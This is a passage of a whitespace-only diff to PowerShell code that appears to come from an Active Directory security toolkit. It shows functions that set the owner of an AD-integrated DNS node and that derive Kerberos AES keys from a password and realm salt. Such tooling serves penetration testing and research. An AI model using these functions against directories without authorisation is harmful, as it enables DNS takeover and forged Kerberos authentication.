         $distinguished_name = "DC=$Node," + $DistinguishedName
     }
@@ -4199,9 +4199,9 @@ function Set-ADIDNSNodeOwner
     .SYNOPSIS
     This function can sets the owner of an ADIDNS Node.
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause 
-    
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
+
     .DESCRIPTION
     This function can sets the owner of an ADIDNS Node.
 
@@ -4296,7 +4296,7 @@ function Set-ADIDNSNodeOwner
 
     if(!$DistinguishedName)
     {
-       
+
         if($Partition -eq 'System')
         {
             $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
@@ -4315,7 +4315,7 @@ function Set-ADIDNSNodeOwner
 
         Write-Verbose "[+] Distinguished Name = $distinguished_name"
     }
-    else 
+    else
     {
         $distinguished_name = "DC=$Node," + $DistinguishedName
     }
@@ -4359,12 +4359,12 @@ function Get-KerberosAESKey
     .SYNOPSIS
     Generate Kerberos AES 128/256 keys from a known username/hostname, password, and kerberos realm. The
     results have been verified against the test values in RFC3962, MS-KILE, and my own test lab.
-    
+
     https://tools.ietf.org/html/rfc3962
     https://msdn.microsoft.com/library/cc233855.aspx
 
-    Author: Kevin Robertson (@kevin_robertson)  
-    License: BSD 3-Clause   
+    Author: Kevin Robertson (@kevin_robertson)
+    License: BSD 3-Clause
 
     .PARAMETER Password
     [String] Valid password.
@@ -4378,7 +4378,7 @@ function Get-KerberosAESKey
     .PARAMETER Iteration
     [Integer] Default = 4096: Int value representing how many iterations of PBKDF2 will be performed. AD uses the
     default of 4096.
-    
+
     .PARAMETER OutputType
     [String] Default = AES: (AES,AES128,AES256,AES128ByteArray,AES256ByteArray) AES, AES128, and AES256 will output strings.
     AES128Byte and AES256Byte will output byte arrays.
@@ -4386,7 +4386,7 @@ function Get-KerberosAESKey
     .EXAMPLE
     Get-KerberosAESKey -Password password -Salt ATHENA.MIT.EDUraeburn -Iteration 1
     Verify results against first RFC3962 sample test vectors in section B.
-    
+
     .EXAMPLE
     Get-KerberosAESKey -Salt TEST.LOCALuser
     Generate keys for a valid AD user.
@@ -4397,13 +4397,13 @@ function Get-KerberosAESKey
 
     [CmdletBinding()]
     param
-    ( 
+    (
         [parameter(Mandatory=$true)][String]$Salt,
         [parameter(Mandatory=$false)][System.Security.SecureString]$Password,
         [parameter(Mandatory=$false)][ValidateSet("AES","AES128","AES256","AES128ByteArray","AES256ByteArray")][String]$OutputType = "AES",
         [parameter(Mandatory=$false)][Int]$Iteration=4096
     )
-    
+
     if(!$Password)
     {
         $password = Read-Host -Prompt "Enter password" -AsSecureString
@@ -4411,12 +4411,12 @@ function Get-KerberosAESKey
 
     $password_BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
     $password_cleartext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($password_BSTR)
-    
+
     [Byte[]]$password_bytes = [System.Text.Encoding]::UTF8.GetBytes($password_cleartext)
     [Byte[]]$salt_bytes = [System.Text.Encoding]::UTF8.GetBytes($Salt)
     $AES256_constant = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4
     $AES128_constant = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93
-    $IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 
+    $IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
     $PBKDF2 = New-Object Security.Cryptography.Rfc2898DeriveBytes($password_bytes,$salt_bytes,$iteration)
     $PBKDF2_AES256_key = $PBKDF2.GetBytes(32)
     $PBKDF2_AES128_key = $PBKDF2_AES256_key[0..15]
@@ -4435,7 +4435,7 @@ function Get-KerberosAESKey
     $AES256_key_part_1 = $AES_encryptor.TransformFinalBlock($AES256_constant,0,$AES256_constant.Length)
     $AES256_key_part_2 = $AES_encryptor.TransformFinalBlock($AES256_key_part_1,0,$AES256_key_part_1.Length)
     $AES256_key = $AES256_key_part_1[0..15] + $AES256_key_part_2[0..15]
-    $AES256_key_string = ([System.BitConverter]::ToString($AES256_key)) -replace "-",""    
+    $AES256_key_string = ([System.BitConverter]::ToString($AES256_key)) -replace "-",""
     # AES 128
     $AES.KeySize = 128
     $AES.Key = $PBKDF2_AES128_key
@@ -4443,38 +4443,38 @@ function Get-KerberosAESKey
     $AES128_key = $AES_encryptor.TransformFinalBlock($AES128_constant,0,$AES128_constant.Length)
     $AES128_key_string = ([System.BitConverter]::ToString($AES128_key)) -replace "-",""
     Remove-Variable password_cleartext
-    
+
     switch($OutputType)
     {
-    
+
         'AES'
         {
             Write-Output "AES128 Key: $AES128_key_string"
             Write-Output "AES256 Key: $AES256_key_string"
         }
-        
+
         'AES128'
         {
             Write-Output "$AES128_key_string"
         }
-        
+
         'AES256'
         {
             Write-Output "$AES256_key_string"
         }
-        
+
         'AES128ByteArray'
         {
             Write-Output $AES128_key
         }
-        
+
         'AES256ByteArray'
         {
             Write-Output $AES256_key
         }
-        
+
     }
-    
+
 }
 
 #endregion
